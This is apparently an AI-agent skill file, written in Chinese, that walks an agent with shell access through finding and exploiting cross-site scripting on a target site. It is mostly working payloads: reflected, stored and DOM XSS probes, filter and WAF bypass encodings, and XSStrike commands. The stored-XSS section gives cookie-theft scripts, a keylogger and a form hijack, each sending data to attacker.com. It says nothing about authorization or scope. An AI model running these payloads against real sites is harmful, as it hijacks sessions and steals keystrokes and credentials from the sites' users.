---
name: xss
description: "跨站脚本漏洞检测与利用。注入测试 payload、识别反射点、绕过 WAF 过滤器、验证弹窗执行并演示 cookie 窃取。当目标存在用户输入反射、评论功能、搜索框、URL 参数显示或富文本渲染时使用。"
allowed-tools: Bash, Read, Write
---

# 跨站脚本攻击 (XSS)

通过在网页中注入恶意脚本，在用户浏览器中执行，实现会话劫持、钓鱼攻击或恶意操作。

## 决策流程

根据输入反射的上下文选择攻击策略：

```
输入反射在哪个上下文？
├── HTML 正文 → 使用 script 标签或事件处理器 payload（见"反射型 XSS"）
├── HTML 属性内 → 闭合属性 + 注入事件处理器（见"属性注入"）
├── JavaScript 代码内 → 闭合字符串 + 注入代码（见"JavaScript 上下文"）
├── URL/href 属性内 → 使用 javascript: 伪协议（见"伪协议注入"）
└── 被过滤/编码？
    ├── 是 → 尝试绕过技术（见"绕过技术"）
    └── 有 CSP？ → 见 CSP_BYPASS_REFERENCE.md
```

## 工作流程

### 步骤 1：侦察 — 识别注入点

寻找用户输入反射到页面的位置：

- 搜索框、评论区、用户名显示
- URL 参数直接显示在页面中
- 富文本编辑器或 Markdown 渲染
- 错误信息包含用户输入
- JSON 响应被直接渲染
- SVG/XML 文件上传

```bash
# 注入唯一标记并检查反射
curl -s "http://target.com/search?q=UNIQUE_XSS_MARKER_12345" | grep "UNIQUE_XSS_MARKER_12345"
```

**验证检查点**：确认标记字符串在响应中原样出现。记录反射位置（HTML 正文、属性、JS 代码内）。

### 步骤 2：上下文识别与基础测试

根据反射位置确定上下文，选择对应的初始 payload：

```bash
# HTML 上下文 — 直接注入标签
curl "http://target.com/search?q=<script>alert(1)</script>"

# 属性上下文 — 闭合属性后注入事件
curl "http://target.com/search?q=\"+onmouseover=\"alert(1)"

# JavaScript 上下文 — 闭合字符串后注入代码
curl "http://target.com/search?q=';alert(1)//"

# URL 上下文 — 伪协议
curl "http://target.com/redirect?url=javascript:alert(1)"
```

**验证检查点**：检查响应中 payload 是否被原样反射、被编码还是被过滤。据此决定是否需要绕过技术。

### 步骤 3：攻击执行

#### 反射型 XSS

**script 标签** — 最直接的注入方式，适用于无过滤的 HTML 上下文：

```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

**事件处理器** — 当 `<script>` 被过滤时使用，利用 HTML 元素的事件属性：

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**伪协议** — 适用于注入点在 href/src/action 等 URL 属性中：

```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```

**数据 URI** — 当 javascript: 被过滤但 data: 未被限制时：

```html
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

**验证检查点**：确认浏览器弹出 alert 对话框或执行了 `document.domain`/`document.cookie` 调用。

#### 存储型 XSS

输入被持久化存储（评论、个人资料等），影响所有访问该页面的用户：

```html
<!-- Cookie 窃取 -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

<!-- 键盘记录 -->
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/?k='+e.key)
}
</script>

<!-- 表单劫持 -->
<script>
document.forms[0].action='http://attacker.com/phish'
</script>
```

**验证检查点**：刷新页面确认 payload 仍然存在并执行。在攻击者服务器上确认收到外泄数据。

#### 属性注入

当注入点在 HTML 属性值内时，先闭合属性再注入：

```html
<!-- 闭合属性后注入事件 -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" autofocus onfocus="alert(1)

<!-- href/src 属性替换 -->
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
```

#### DOM XSS

客户端 JavaScript 将不可信数据传入危险 API。详细的 Source/Sink 列表见 `DOM_XSS_REFERENCE.md`。

```javascript
// 常见利用 payload
#<img src=x onerror=alert(1)>
?default=<script>alert(1)</script>
#';alert(1)//
```

**验证检查点**：使用浏览器开发者工具确认 DOM 被修改，payload 在客户端执行。

#### 特殊标签注入

```html
<!-- SVG -->
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<svg><animate onbegin=alert(1)>

<!-- MathML -->
<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>
```

### 步骤 4：绕过技术

当基础 payload 被过滤时，逐步升级绕过手段：

#### 大小写混合

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

#### 编码绕过

```html
<!-- HTML 实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Unicode -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- URL 编码 / 双重编码 -->
<a href="javascript:%61%6c%65%72%74(1)">click</a>
%253Cscript%253Ealert(1)%253C/script%253E
```

#### 标签变形

```html
<!-- 空格替代（/、Tab） -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- 换行分隔 -->
<img src=x
onerror=alert(1)>

<!-- 不常见标签 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

#### 关键字绕过

```html
<!-- script 被过滤 — 嵌套绕过 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- alert 被过滤 — 替代函数 -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>[].constructor.constructor('alert(1)')()</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 括号被过滤 -->
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>

<!-- 引号被过滤 -->
<script>alert(/XSS/.source)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

**验证检查点**：每次尝试绕过后检查响应，确认 payload 未被过滤且能执行。

### 步骤 5：CSP 绕过（如适用）

检查目标 CSP 策略并选择绕过方式。详细方法见 `CSP_BYPASS_REFERENCE.md`。

```bash
# 检查 CSP 头
curl -sI "http://target.com" | grep -i "content-security-policy"
```

## 工具辅助

### XSStrike

```bash
# 基础扫描
python3 xsstrike.py -u "http://target.com/search?q=test"

# POST 请求
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# 爬虫模式
python3 xsstrike.py -u "http://target.com" --crawl

# WAF 绕过模式
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer
```

## 最佳实践

1. 先注入唯一标记确认反射，再尝试实际 payload
2. 从简单 payload 开始，逐步升级到编码/绕过
3. 始终确认注入上下文（HTML/属性/JS/URL）再选择 payload
4. 检查 CSP 和 WAF，针对性选择绕过策略
5. 存储型 XSS 优先级高于反射型 — 影响范围更大
6. 每次注入后验证执行结果，不要假设成功
